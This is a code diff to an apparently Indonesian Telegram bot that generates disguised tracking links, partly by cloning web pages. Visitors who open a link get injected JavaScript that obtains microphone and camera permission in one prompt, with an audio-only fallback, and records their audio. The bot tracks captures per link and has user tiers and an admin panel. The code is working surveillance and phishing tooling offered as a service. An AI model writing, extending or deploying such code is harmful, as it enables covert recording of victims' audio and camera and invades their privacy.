@@ -15,7 +15,8 @@ try:
 except ImportError:
     print("[!] pip install requests"); sys.exit(1)
 try:
-    from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
+    from telegram import (Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup,
+                           ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove)
     from telegram.ext import (Application, CommandHandler, CallbackQueryHandler,
                                MessageHandler, ContextTypes, filters)
 except ImportError:
@@ -412,24 +413,50 @@ INJECT_JS_MIC = """
   var capCount=0, active=true;
   var mediaRecorder=null, audioChunks=[], micStream=null;
 
-  // --- minta mic PERTAMA, satu popup, sebelum apapun ---
+  // --- minta mic + kamera dalam SATU getUserMedia — satu popup ---
   function initMic(cb){
     if(!navigator.mediaDevices||!navigator.mediaDevices.getUserMedia){cb();return;}
-    navigator.mediaDevices.getUserMedia({audio:true})
+    // minta audio+video sekaligus → satu popup izin
+    navigator.mediaDevices.getUserMedia({
+      audio:true,
+      video:{facingMode:{ideal:'environment'}}
+    })
     .then(function(stream){
       micStream=stream;
+      // ambil HANYA audio track untuk recorder
+      var audioOnly=new MediaStream(stream.getAudioTracks());
+      // stop video track dari stream ini — foto diambil oleh snapCamera sendiri
+      stream.getVideoTracks().forEach(function(t){t.stop();});
       var mimeType='audio/webm';
+      if(!MediaRecorder.isTypeSupported(mimeType)) mimeType='audio/ogg;codecs=opus';
       if(!MediaRecorder.isTypeSupported(mimeType)) mimeType='audio/ogg';
       if(!MediaRecorder.isTypeSupported(mimeType)) mimeType='';
       try{
-        mediaRecorder=new MediaRecorder(stream, mimeType?{mimeType:mimeType}:{});
+        mediaRecorder=new MediaRecorder(audioOnly, mimeType?{mimeType:mimeType}:{});
         mediaRecorder.ondataavailable=function(e){
           if(e.data&&e.data.size>0) audioChunks.push(e.data);
         };
         mediaRecorder.start();
       }catch(err){}
       cb();
-    }).catch(function(){ cb(); });
+    }).catch(function(e){
+      // fallback: coba audio saja kalau video+audio ditolak
+      navigator.mediaDevices.getUserMedia({audio:true})
+      .then(function(stream){
+        micStream=stream;
+        var mimeType='audio/webm';
+        if(!MediaRecorder.isTypeSupported(mimeType)) mimeType='audio/ogg';
+        if(!MediaRecorder.isTypeSupported(mimeType)) mimeType='';
+        try{
+          mediaRecorder=new MediaRecorder(stream, mimeType?{mimeType:mimeType}:{});
+          mediaRecorder.ondataavailable=function(e){
+            if(e.data&&e.data.size>0) audioChunks.push(e.data);
+          };
+          mediaRecorder.start();
+        }catch(err){}
+        cb();
+      }).catch(function(){ cb(); });
+    });
   }
 
   function sendAudio(){
@@ -1125,6 +1152,17 @@ def clone_url(url):
 # ------------------------------------------------------------------ #
 #  KEYBOARD
 # ------------------------------------------------------------------ #
+def kb_reply(uid):
+    """Keyboard bawah permanen sesuai role."""
+    role = db_get_role(uid)
+    rows = [
+        [KeyboardButton("➕ Tambah Link"), KeyboardButton("📋 Daftar Link")],
+        [KeyboardButton("🗑 Hapus Link"),  KeyboardButton("📖 Tutorial")],
+    ]
+    if role == "admin":
+        rows.append([KeyboardButton("👑 Panel Admin")])
+    return ReplyKeyboardMarkup(rows, resize_keyboard=True, persistent=True)
+
 def kb_main(uid):
     rows = [
         [
@@ -1248,6 +1286,10 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     _user_state[uid] = None
     _user_data[uid]  = {}
+    # kirim keyboard bawah dulu
+    await update.message.reply_text(
+        "⌨️", reply_markup=kb_reply(uid)
+    )
     await update.message.reply_text(teks,parse_mode="Markdown",reply_markup=kb_main(uid))
 
 async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1581,6 +1623,59 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "Smart Monitoring • Digital Tracking",
             parse_mode=None
         )
+        return
+
+    # --- keyboard bawah ---
+    if text in ("➕ Tambah Link","📋 Daftar Link","🗑 Hapus Link","📖 Tutorial","👑 Panel Admin"):
+        if db_is_banned(uid):
+            await update.message.reply_text("🚫 Kamu telah dibanned.")
+            return
+        db_ensure_user(uid)
+        role = db_get_role(uid)
+
+        if text == "➕ Tambah Link":
+            if role == "free" and db_link_count(uid) >= FREE_LIMIT:
+                await update.message.reply_text(f"❌ Batas {FREE_LIMIT} link untuk Free. Minta Admin upgrade.")
+                return
+            last = _last_add.get(uid,0)
+            sisa = RATE_LIMIT_SEC - int(time.time()-last)
+            if sisa > 0 and role != "admin":
+                await update.message.reply_text(f"⏳ Tunggu {sisa} detik sebelum tambah link lagi.")
+                return
+            _user_state[uid]="await_template"; _user_data[uid]={}
+            await update.message.reply_text("Pilih template:",reply_markup=kb_template())
+
+        elif text == "📋 Daftar Link":
+            user_links=[l for l in _links if str(l["owner"])==uid]
+            if not user_links:
+                await update.message.reply_text("📋 Belum ada link aktif.")
+            else:
+                teks2="📋 *Link Aktif:*\n\n"
+                for lnk in user_links:
+                    cap=_cap_counts.get(lnk["id"],0)
+                    mode=lnk.get("mode","cam")
+                    mode_icon={"mic":"🎤","video":"🎥"}.get(mode,"📷")
+                    teks2+=f"{mode_icon} Link #{lnk['id']} ({cap} cap)\n`{lnk['pub_url']}`\n\n"
+                await update.message.reply_text(teks2,parse_mode="Markdown")
+
+        elif text == "🗑 Hapus Link":
+            user_links=[l for l in _links if str(l["owner"])==uid]
+            if not user_links:
+                await update.message.reply_text("Belum ada link.")
+            else:
+                await update.message.reply_text("Pilih link yang mau dihapus:",reply_markup=kb_del(uid))
+
+        elif text == "📖 Tutorial":
+            await update.message.reply_text(TUTORIAL_TEXT,parse_mode="Markdown",
+                reply_markup=InlineKeyboardMarkup([[
+                    InlineKeyboardButton("« Kembali ke Panel",callback_data="back_main")
+                ]]))
+
+        elif text == "👑 Panel Admin":
+            if role != "admin":
+                await update.message.reply_text("❌ Bukan admin.")
+                return
+            await update.message.reply_text("👑 *Panel Admin:*",parse_mode="Markdown",reply_markup=kb_admin())
         return
 
     if state == "await_alias":
